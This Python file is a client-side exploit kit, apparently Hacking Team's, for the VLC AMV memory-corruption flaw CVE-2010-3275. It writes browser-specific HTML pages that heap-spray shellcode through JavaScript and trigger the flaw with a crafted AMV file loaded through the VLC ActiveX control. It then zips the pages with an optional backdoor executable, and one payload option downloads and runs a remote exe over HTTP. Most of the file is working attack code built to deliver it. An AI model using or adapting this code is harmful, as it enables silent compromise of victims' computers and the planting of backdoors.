#! /usr/bin/env python

#Copyright HT srl, 2011
#http://www.hackingteam.it/ for more information

#cod

#
# VLC Media Player AMV Size Processing Memory Corruption Vulnerability (CVE-2010-3275)
# vupen

import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile
import base64
import bz2
from random import *

import x86shelldrophttp
import x86firststage
import x86heap
import x86int3
import ASCIIHexWhitespace
import x86helloworld
import jscript_unicode

NAME="vlc_media_player_117"
DESCRIPTION="VLC Media Player AMV Size Processing Memory Corruption Vulnerability (CVE-2010-3275)"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="VLC"
DOCUMENTATION["Repeatability"]="One Shot"
DOCUMENTATION["Date public"] = "2011/05/05"
DOCUMENTATION["CVE Name"] = "CVE-2010-3275"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3275"
DOCUMENTATION["Note"] = "libdirectx_plugin.dll in VideoLAN VLC Media Player before 1.1.8 allows remote attackers to execute arbitrary code via a crafted width in an AMV file, related to a dangling pointer vulnerability. "

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000","XP", "VISTA", "SEVEN"]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
"""

CHANGELOG="""

"""

DEBUGNOTES="""
"""

class exploit:
	
	infile =""
	outfile =""

	def __init__(self, backdoorPath, zipFile):
		#self.setInfo(DESCRIPTION)
		self.setVersions()
		self.r = Random()
		self.r.seed()
		self.name=NAME
		self.debugmode = dbg
		self.outputCompressed = zipFile
		self.backdoorPath = backdoorPath
		self.trigger_file = self.randfilename() + ".amv"
		
	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename
	
	def displayVersions(self):
		for v in self.versions.keys():
			print "Version %d: %s"%(v,self.versions[v][0])

	def setVersions(self):
		self.versions={}
		#name, jmp esp, writeloc, writable, shelloc
		#                                    POP/POP/RET
		self.versions[1]=("VLC Media Player", 0x04040404)
   
	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.backdoorPath)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.backdoorPath)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	
	def run(self):
		self.makefile()
				
		return 1

	def get_root_index_content(self):
		value = """
	<script type="text/javascript">

if (/MSIE (\d+\.\d+);/.test(navigator.userAgent)){
 var ieversion=new Number(RegExp.$1)
 if (ieversion>8)
  location.href("about:blank")
 else if (ieversion==8)
  location.href("index8.html")
 else if (ieversion>=6)
  location.href("index6.html")
 else if (ieversion>=5)
  document.write("")
}
else
 document.write("")
</script>
"""
		return value

	def get_index6(self):
		"""Makes the actual bad html file to trigger the buffer overflow"""
		
		adapter = jscript_unicode.jscript_unicode()
		
		nops = struct.pack("l", self.versions[1][1])
		nop_sled = adapter.get(nops)
		
		var_blocks = self.randfilename()
		var_shellcode = self.randfilename()
		var_index = self.randfilename()
		var_nopsled = self.randfilename()
		spray_func = self.randfilename()
		obj_id = self.randfilename()
		
		shellcode = self.createShellcode()
	
		shellcode = adapter.get(shellcode)
		
		html = """<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
<HTML>
<script>
String.prototype.repeat = function( num )
{
    return new Array( num + 1 ).join( this );
}

function getSpraySlide(spraySlide, spraySlideSize)
{
	while (spraySlide.length*2<spraySlideSize)
	{
		spraySlide += spraySlide;
	}
    spraySlide = spraySlide.substring(0,spraySlideSize/2);
    return (spraySlide);
}

function DoHeapSpray()
{
	var shellcode = unescape(#{shellcode});
	
	var spraySlide = unescape("%u0c0c%u0c0c"); 
	var heapSprayToAddress = 0x2c000000;
	var heapBlockSize = 0x400000;
	var SizeOfHeapDataMoreover = 0x5;
	var payLoadSize = (shellcode.length * 2);
	var spraySlideSize = heapBlockSize - (payLoadSize + SizeOfHeapDataMoreover);
	var heapBlocks = (heapSprayToAddress+heapBlockSize)/heapBlockSize;
	var memory = new Array();
	
	spraySlide = getSpraySlide(spraySlide,spraySlideSize);
	
	for (i=0;i<heapBlocks;i++)
	{
	memory[i] = spraySlide +  shellcode;
	}
}

DoHeapSpray();
</script>

<BODY>
    <OBJECT classid="clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921"
            codebase="http://downloads.videolan.org/pub/videolan/vlc/latest/win32/axvlc.cab"
            width="0" height="0" id="vlc" events="True">
        <param name="Src" value="#{trigger_file}" />
        <param name="ShowDisplay" value="True" />
        <param name="AutoLoop" value="False" />
        <param name="AutoPlay" value="True" />
    </OBJECT>
    
    

</BODY>
</HTML>
	"""
	
		#Replace filename
		html = html.replace("#{trigger_file}", self.trigger_file)
		html = html.replace("#{spray_func}", spray_func)
		html = html.replace("#{var_blocks}", var_blocks)
		html = html.replace("#{var_shellcode}", var_shellcode)
		html = html.replace("#{shellcode}", '\"' + shellcode + '\"')
		html = html.replace("#{var_nopsled}", var_nopsled)
		html = html.replace("#{nop_sled}", '\"' + nop_sled + '\"')
		html = html.replace("#{var_index}", var_index)
		html = html.replace("#{obj_id}", obj_id)
		
		return html
		
	def get_index8(self):
		"""Makes the actual bad html file to trigger the buffer overflow"""
		
		adapter = jscript_unicode.jscript_unicode()
		
		nops = struct.pack("l", self.versions[1][1])
		nop_sled = adapter.get(nops)
		
		var_blocks = self.randfilename()
		var_shellcode = self.randfilename()
		var_index = self.randfilename()
		var_nopsled = self.randfilename()
		spray_func = self.randfilename()
		obj_id = self.randfilename()
		
		shellcode = self.createShellcode()
	
		shellcode = adapter.get(shellcode)
		
		html = """<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
<HTML>
<script>

var payLoadCode = unescape(#{shellcode});

var l = payLoadCode.length;

n = 2*256 - 2*l;

var fill = "";
for (j = 0; j<n/2;j++) { fill = fill + "%u4141"; }

String.prototype.repeat = function( num )
{
    return new Array( num + 1 ).join( this );
}

function getSpraySlide(spraySlide, spraySlideSize)
{
	while (spraySlide.length*2<spraySlideSize)
	{
		spraySlide += spraySlide;
	}
    spraySlide = spraySlide.substring(0,spraySlideSize/2);
    return (spraySlide);
}

function DoHs() {

var heapSprayToAddress = 0x32323232; // /!\ spraying up to this address
var heapBlockSize = 0x100000 - 0x1000;
var SizeOfHeapDataMoreover = 0x38;
var payLoadSize = (payLoadCode.length * 2);
var spraySlideSize = heapBlockSize - (payLoadSize + SizeOfHeapDataMoreover); 
var heapBlocks = (heapSprayToAddress+heapBlockSize)/heapBlockSize;
var memory = new Array(); 

for (i=0;i<heapBlocks;i++)
{
    var spraySlide =  unescape( ""

			+"%u1111%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0000%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c"
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%ufa3e%u6af3%u0c0c%u0c0c%u0c0c"
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c"
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c"
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 

            + payLoadCode + unescape(fill) 

			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c"
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c"
            +"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c"
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c"
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" 
			+"%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u4494%u6af7"
			+"%u0124%u3030%u0000%u3030%u1000%u0000%u0040%u0000"
			+"%u3030%u3030%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c" )
            
    spraySlide = getSpraySlide(spraySlide,spraySlideSize);
    memory[i] = spraySlide;
}

}

DoHs();
</script>

<BODY>
    <OBJECT classid="clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921" codebase="http://downloads.videolan.org/pub/videolan/vlc/latest/win32/axvlc.cab" width="0" height="0" id="vlc" events="True">
        <param name="Src" value="#{trigger_file}" />
        <param name="ShowDisplay" value="True" />
        <param name="AutoLoop" value="False" />
        <param name="AutoPlay" value="True" />
    </OBJECT>
</BODY>
</HTML>
	"""
	
		#Replace filename
		html = html.replace("#{trigger_file}", self.trigger_file)
		html = html.replace("#{spray_func}", spray_func)
		html = html.replace("#{var_blocks}", var_blocks)
		html = html.replace("#{var_shellcode}", var_shellcode)
		html = html.replace("#{shellcode}", '\"' + shellcode + '\"')
		html = html.replace("#{var_nopsled}", var_nopsled)
		html = html.replace("#{nop_sled}", '\"' + nop_sled + '\"')
		html = html.replace("#{var_index}", var_index)
		html = html.replace("#{obj_id}", obj_id)
		
		return html

	def makefile(self):
	
		html_index = self.get_root_index_content()
		html_index6 = self.get_index6()
		html_index8 = self.get_index8()
		
		with warnings.catch_warnings():
			warnings.simplefilter('ignore')
			tmp_index = os.tempnam()
			tmp_index8 = os.tempnam()
			tmp_index6 = os.tempnam()
			tmp_backdoor = os.tempnam()
			
		f = open(tmp_index,mode='wb')
		f.write(html_index)
		f.close()
		
		f = open(tmp_index6,mode='wb')
		f.write(html_index6)
		f.close()
		
		f = open(tmp_index8,mode='wb')
		f.write(html_index8)
		f.close()
		
		# Create the output archive
		print "Creating %s zip file archive"%(self.outputCompressed)
		zip = zipfile.ZipFile(self.outputCompressed, "w", zipfile.ZIP_DEFLATED)
		
		print "Adding index file"
		zip.write(tmp_index, "index.html")
		
		print "Adding file for IE6/IE7"
		zip.write(tmp_index6, "index6.html")
		
		print "Adding file for IE8"
		zip.write(tmp_index8, "index8.html")
		
		print "Adding CVE-2010-3275.amv from resources"
		zip.write("resources/CVE-2010-3275.amv", self.trigger_file)
		
		if extraPath != None:
			print "Adding copy of backdoor"
			zip.write(extraPath, "backdoor.exe")

		zip.close()
		
		try:
			os.unlink(tmp_index)
			os.unlink(tmp_index8)
			os.unlink(tmp_index6)
		except WindowsError:
			print "I/O error when deleting temp. files"
			
		return 1


if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 3:
		print "[ERROR] %s require 3 parameters"%(DESCRIPTION)
		print "[-INFO] {payload:[http|local|debug]} [localbackdoor|urltodownload] output"
		sys.exit(0)

	# Parse payload section
	if sys.argv[1].split(':')[0] != "payload":
		print "[ERROR] First parameters must be payload"
		sys.exit(0)
	else:
		requiredpayload = sys.argv[1].split(':')[1]	
		if requiredpayload == "http":
			print "[HTTP] Using HTTP reverse connect to download exe"
			payload = 1
			http = True
			if len(sys.argv) > 3:
				extraPath = sys.argv[4]
			else:
				extraPath = None
				
		elif requiredpayload == "debug":
			print "[DEBUG] Using INT3 exploit mode"
			payload = 0
			dbg = True
		elif requiredpayload == "local":
			print "[LOCAL] Run from %currdir%"
			payload = 2
		else:
			print "[ERROR] Unknown payload defined"
			sys.exit(0)
	
	# Interprete section
	
	if http == False:
		if os.path.isfile(sys.argv[3]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[3])
			sys.exit(0)

		if os.path.getsize(sys.argv[3]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[3])
			sys.exit(0)

	#if os.path.isfile("resources/blank.pdf") == False:
	#	print "[ERROR] resources/blank.pdf not found"
	#	sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)

	app=exploit(sys.argv[2], sys.argv[3])
	app.run()
	
	print ' ... done'